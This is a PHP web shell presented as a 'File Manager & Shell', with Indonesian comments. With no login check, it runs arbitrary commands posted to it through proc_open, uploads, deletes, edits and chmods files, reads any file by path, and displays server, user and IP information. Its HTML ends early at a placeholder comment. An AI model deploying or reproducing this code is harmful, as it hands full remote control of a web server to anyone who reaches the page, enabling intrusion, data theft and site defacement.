<?php
error_reporting(0);
set_time_limit(0);

// === File Manager + Shell (single file, ready to download) ===
// - Menampilkan file/folder dengan icon berdasarkan ekstensi
// - Bisa membuat file/dir, upload, delete, chmod
// - Edit file via modal (AJAX)
// - Terminal (AJAX) menjalankan perintah di direktori saat ini
// - Sesuaikan izin dan environment sebelum dipakai di server produksi

// ---------------------------
// Configuration: icon mapping
// ---------------------------
$file_icons = [
    'htaccess' => 'https://solevisible.com/icons/htaccess.png',
    'php'      => 'https://solevisible.com/icons/php.png',
    'txt'      => 'https://solevisible.com/icons/txt.png',
    'xml'      => 'https://solevisible.com/icons/xml.png',
    'html'     => 'https://solevisible.com/icons/html.png',
    'default'  => 'https://solevisible.com/icons/notfound.png'
];

function get_file_icon($filename, $file_icons) {
    $base = basename($filename);
    // Khusus .htaccess
    if (strtolower($base) === '.htaccess') return $file_icons['htaccess'];

    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if ($ext && isset($file_icons[$ext])) return $file_icons[$ext];
    return $file_icons['default'];
}

// ---------------------------
// Utility functions
// ---------------------------
function safe_path($path) {
    $real = @realpath($path);
    return $real ?: false;
}

function getUserGroup($file) {
    $uid = @fileowner($file);
    $gid = @filegroup($file);
    if (function_exists('posix_getpwuid')) {
        $user_info = @posix_getpwuid($uid);
        $user = $user_info ? $user_info['name'] : $uid;
    } else {
        $user = $uid;
    }
    if (function_exists('posix_getgrgid')) {
        $group_info = @posix_getgrgid($gid);
        $group = $group_info ? $group_info['name'] : $gid;
    } else {
        $group = $gid;
    }
    return [$user, $group];
}

function formatPerm($perm) {
    $type = '?';
    if (($perm & 0xC000) === 0xC000) $type = 's';
    elseif (($perm & 0xA000) === 0xA000) $type = 'l';
    elseif (($perm & 0x8000) === 0x8000) $type = '-';
    elseif (($perm & 0x6000) === 0x6000) $type = 'b';
    elseif (($perm & 0x4000) === 0x4000) $type = 'd';
    elseif (($perm & 0x2000) === 0x2000) $type = 'c';
    elseif (($perm & 0x1000) === 0x1000) $type = 'p';

    $rwx = '';
    $masks = [ 
        0x0100, 0x0080, 0x0040,
        0x0020, 0x0010, 0x0008,
        0x0004, 0x0002, 0x0001
    ];
    $chars = ['r','w','x','r','w','x','r','w','x'];

    for ($i=0; $i<9; $i++) {
        $rwx .= ($perm & $masks[$i]) ? $chars[$i] : '-';
    }

    if ($perm & 0x800) $rwx[2] = ($rwx[2] == 'x') ? 's' : 'S';
    if ($perm & 0x400) $rwx[5] = ($rwx[5] == 'x') ? 's' : 'S';
    if ($perm & 0x200) $rwx[8] = ($rwx[8] == 'x') ? 't' : 'T';

    return $type . $rwx;
}

function permOctal($perm) {
    return substr(sprintf('%o', $perm), -4);
}

function human_filesize($bytes, $decimals = 2) {
    $sz = ['B','KB','MB','GB','TB','PB'];
    if ($bytes == 0) return '0B';
    $factor = floor((strlen((string)$bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $sz[$factor];
}

// ---------------------------
// Initial path and terminal handling
// ---------------------------
$initial_path = realpath(getcwd());
$path = $initial_path;

// Terminal AJAX handler
$isTerminalRequest = isset($_POST['terminal_command']);
if ($isTerminalRequest) {
    if (isset($_GET['path'])) {
        $tmp = realpath($_GET['path']);
        if ($tmp && is_dir($tmp)) $path = $tmp;
    }
    chdir($path);
    $cmd = $_POST['terminal_command'];
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = @proc_open($cmd, $descriptorspec, $pipes);
    $output = '';
    if (is_resource($process)) {
        @fclose($pipes[0]);
        $output = @stream_get_contents($pipes[1]);
        @fclose($pipes[1]);
        $err = @stream_get_contents($pipes[2]);
        @fclose($pipes[2]);
        @proc_close($process);
        if ($err) $output .= "\nError:\n" . $err;
    } else {
        $output = "Failed to execute command.";
    }
    header('Content-Type: text/plain');
    echo $output;
    exit;
}

// ---------------------------
// Normal file manager flow
// ---------------------------
if (isset($_GET['path'])) {
    $tmp = realpath($_GET['path']);
    if ($tmp && is_dir($tmp)) $path = $tmp;
}

// System info
$uname = php_uname();
$userInfo = @posix_getpwuid(posix_geteuid());
$groupInfo = @posix_getgrgid(posix_getegid());
$phpVersion = phpversion();
$safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? 'localhost');
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$dateTime = date('Y-m-d H:i:s');
$software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

// AJAX file view
if (isset($_GET['ajax_view'])) {
    $file = safe_path($_GET['ajax_view']);
    if ($file && is_file($file) && is_readable($file)) {
        echo file_get_contents($file);
    } else {
        http_response_code(404);
        echo "ERROR: File not found or unreadable.";
    }
    exit;
}

// Handle create file
if (isset($_POST['make_file_submit']) && !empty($_POST['make_file'])) {
    $new_file_name = basename($_POST['make_file']);
    $new_file_path = $path . DIRECTORY_SEPARATOR . $new_file_name;
    if (!file_exists($new_file_path)) {
        $created = @file_put_contents($new_file_path, '');
        if ($created !== false) {
            header("Location: ?path=" . urlencode($path));
            exit;
        } else {
            $msg_error = '[ERROR] Failed to create new file.';
        }
    } else {
        $msg_error = '[ERROR] File already exists or invalid name.';
    }
}

// Handle create dir
if (isset($_POST['make_dir_submit']) && !empty($_POST['make_dir'])) {
    $new_dir_name = basename($_POST['make_dir']);
    $new_dir_path = $path . DIRECTORY_SEPARATOR . $new_dir_name;
    if (!file_exists($new_dir_path)) {
        if (@mkdir($new_dir_path, 0755)) {
            header("Location: ?path=" . urlencode($path));
            exit;
        } else {
            $msg_error = '[ERROR] Failed to create new directory.';
        }
    } else {
        $msg_error = '[ERROR] Directory already exists or invalid name.';
    }
}

// Change directory
if (isset($_POST['change_dir_submit']) && !empty($_POST['change_dir'])) {
    $target_dir_input = $_POST['change_dir'];
    if (substr($target_dir_input, 0, 1) === DIRECTORY_SEPARATOR) {
        $target_dir = safe_path($target_dir_input);
    } else {
        $target_dir = safe_path($path . DIRECTORY_SEPARATOR . $target_dir_input);
    }
    if ($target_dir && is_dir($target_dir)) {
        header("Location: ?path=" . urlencode($target_dir));
        exit;
    } else {
        $msg_error = '[ERROR] Target directory not found or invalid.';
    }
}

// Delete file/dir
if (isset($_GET['delete'])) {
    $target = safe_path($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && file_exists($target)) {
        if (is_dir($target)) {
            @rmdir($target);
        } else {
            @unlink($target);
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
}

// Upload file
if (isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $filetmp  = $_FILES['file']['tmp_name'];
    $target = $path . DIRECTORY_SEPARATOR . $filename;
    if (move_uploaded_file($filetmp, $target)) {
        $msg_success = '[OK] Upload successful: ' . htmlspecialchars($filename);
    } else {
        $msg_error = '[ERROR] Upload failed!';
    }
}

// Save file
if (isset($_POST['save_file']) && isset($_POST['filename'])) {
    $file_to_save = safe_path($path . DIRECTORY_SEPARATOR . $_POST['filename']);
    if ($file_to_save && is_file($file_to_save) && is_writable($file_to_save)) {
        file_put_contents($file_to_save, $_POST['save_file']);
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && 
            strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
            echo 'OK';
            exit;
        }
        header("Location: ?path=" . urlencode($path) . "&view=" . urlencode($_POST['filename']));
        exit;
    } else {
        $msg_error = '[ERROR] File not found or not writable.';
    }
}

// Chmod
if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
    $file_to_chmod = safe_path($path . DIRECTORY_SEPARATOR . $_POST['chmod_file']);
    $perm = intval($_POST['new_perm'], 8);
    if ($file_to_chmod && file_exists($file_to_chmod)) {
        chmod($file_to_chmod, $perm);
        header("Location: ?path=" . urlencode($path));
        exit;
    } else {
        $msg_error = '[ERROR] File/directory not found or access denied.';
    }
}

// File viewing
$file_view_content = '';
$file_to_view_path = false;
if (isset($_GET['view'])) {
    $file_to_view_path = safe_path($path . DIRECTORY_SEPARATOR . $_GET['view']);
    if ($file_to_view_path && is_file($file_to_view_path) && is_readable($file_to_view_path)) {
        $file_view_content = file_get_contents($file_to_view_path);
    } else {
        $file_view_content = "File not found or access denied.";
    }
}

// ---------------------------
// Output HTML
// ---------------------------
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8" />
<title>File Manager & Shell</title>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  min-height: 100%;
}

body {
  padding: 20px;
  background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background color */
  background-image: url('https://i.imgur.com/gnQC6Ou.png');
  background-size: cover;
  background-position: center center;
  background-attachment: fixed;
  background-repeat: no-repeat;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  color: #ddd;
  line-height: 1.6;
  min-height: 100vh;
}

table {
  width: 100%;
  border-collapse: separate;
  border-spacing: 0;
  margin-top: 1rem;
  background-color: rgba(0, 0, 0, 0.5); /* Transparent table background */
  border-radius: 8px;
  overflow: hidden;
}

thead {
  background: linear-gradient(90deg, rgba(34, 34, 34, 0.7), rgba(51, 51, 51, 0.7)); /* Semi-transparent header */
}

th, td {
  padding: 12px 16px;
  text-align: left;
  font-size: 0.95rem;
  vertical-align: middle;
  color: #ccc;
}

h2, h3 {
  font-weight: 600;
}

a {
  color: #61dafb;
  text-decoration: none;
}

a:hover {
  color: #21a1f1;
}

/* Tombol dengan ikon */
.actions-container {
  display: flex;
  gap: 16px;
  flex-wrap: wrap;
  align-items: flex-end;
  margin-top: 2rem;
}

.actions-label {
  display: flex;
  flex-direction: column;
  font-weight: 600;
  font-size: 0.9rem;
  color: #ccc;
  min-width: 160px;
  max-width: 280px;
}

.actions-label input[type=text], .actions-label input[type=file] {
  margin-top: 6px;
  padding: 8px 12px;
  font-family: monospace;
  font-size: 1rem;
  border-radius: 5px;
  border: 1.5px solid #333;
  background-color: #1f1f1f;
  color: #0f0;
}

.btn-primary {
  background-color: rgba(97, 218, 251, 0.7); /* Transparent background for buttons */
  color: #121212;
  border: none;
  padding: 10px 20px;
  font-weight: 600;
  border-radius: 5px;
  cursor: pointer;
  min-width: 110px;
  height: 38px;
  display: inline-flex;
  align-items: center;
  gap: 8px; /* Menambahkan jarak antara ikon dan teks */
  justify-content: center;
}

.btn-primary:hover {
  background-color: rgba(33, 161, 241, 0.7);
}

/* Ikon tombol */
.btn-icon {
  width: 16px; /* Ukuran ikon */
  height: 16px; /* Ukuran ikon */
}
</style>
</head>
<body>

<div class='sysinfo'>
<h2>System Information</h2>
<table>
<tr><td>Uname:</td><td><?=htmlspecialchars($uname)?></td></tr>
<tr><td>User:</td><td><?=(isset($userInfo['uid'])?$userInfo['uid']:'-')?> [ <?=(isset($userInfo['name'])?$userInfo['name']:'-')?> ] Group: <?=(isset($groupInfo['gid'])?$groupInfo['gid']:'-')?> [ <?=(isset($groupInfo['name'])?$groupInfo['name']:'-')?> ]</td></tr>
<tr><td>PHP:</td><td><?=$phpVersion?> &nbsp; Safe Mode: <?=$safeMode?></td></tr>
<tr><td>ServerIP:</td><td><?=$serverIP?> &nbsp; Your IP: <?=$clientIP?></td></tr>
<tr><td>DateTime:</td><td><?=$dateTime?></td></tr>
<tr><td>SoftWare:</td><td><?=$software?></td></tr>
</table>
</div>

<h2>File Manager & Shell</h2>

<form class="actions-container" method="post" enctype="multipart/form-data">
  <label class="actions-label">
    Make File:
    <input type="text" name="make_file" placeholder="New filename" autocomplete="off" />
  </label>
  <button type="submit" name="make_file_submit" class="btn-primary">
    <img src="https://solevisible.com/images/btn.png" alt="Create File Icon" class="btn-icon" />
    Create File
  </button>

  <label class="actions-label">
    Make Dir:
    <input type="text" name="make_dir" placeholder="New directory name" autocomplete="off" />
  </label>
  <button type="submit" name="make_dir_submit" class="btn-primary">
    <img src="https://solevisible.com/images/btn.png" alt="Create Directory Icon" class="btn-icon" />
    Create Directory
  </button>

  <label class="actions-label" style="flex-grow: 1; min-width: 220px;">
    Upload File:
    <input type="file" name="file" />
  </label>
  <button type="submit" class="btn-primary">
    <img src="https://solevisible.com/images/btn.png" alt="Upload Icon" class="btn-icon" />
    Upload
  </button>
</form>

<!-- The rest of your table and code here -->

</body>
</html>
